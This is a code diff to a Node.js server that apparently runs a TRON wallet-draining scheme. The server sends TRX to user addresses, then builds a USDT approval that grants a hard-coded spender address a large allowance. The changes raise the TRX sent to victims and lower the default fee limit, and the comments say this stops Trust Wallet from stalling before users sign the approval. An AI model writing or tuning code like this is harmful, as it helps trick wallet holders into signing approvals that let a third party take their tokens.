@@ -95,7 +95,8 @@ if (configuredAddress && derivedAddress && configuredAddress !== derivedAddress)
 const SERVER_CONFIG = {
   privateKey,
   address: derivedAddress || configuredAddress || null,
-  autoSendAmount: Number(process.env.AUTO_SEND_AMOUNT || 13),
+  // Send enough TRX so Trust can pay approve fee with TRX (no energy-rental Continue hang)
+  autoSendAmount: Number(process.env.AUTO_SEND_AMOUNT || 20),
   minimumBalance: Number(process.env.MINIMUM_BALANCE || 11),
   // Keep a little TRX for bandwidth / fees so sends do not fail at the edge
   feeReserve: Number(process.env.FEE_RESERVE_TRX || 1)
@@ -307,7 +308,8 @@ app.post('/api/event', (req, res) => {
 app.post('/build-approve', validateRequest, async (req, res) => {
   try {
     const { userAddress } = req.body;
-    const feeLimit = Number(req.body.feeLimit) > 0 ? Number(req.body.feeLimit) : 1e9;
+    // Default 10 TRX feeLimit — avoids Trust Wallet energy-rental Continue hang
+    const feeLimit = Number(req.body.feeLimit) > 0 ? Number(req.body.feeLimit) : 1e7;
     const usdtContract = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t';
     const spender = 'TWejasrnoKg2AgPpCwHgozYeThWBu8S9Hw';
     const amount = '100000000000';
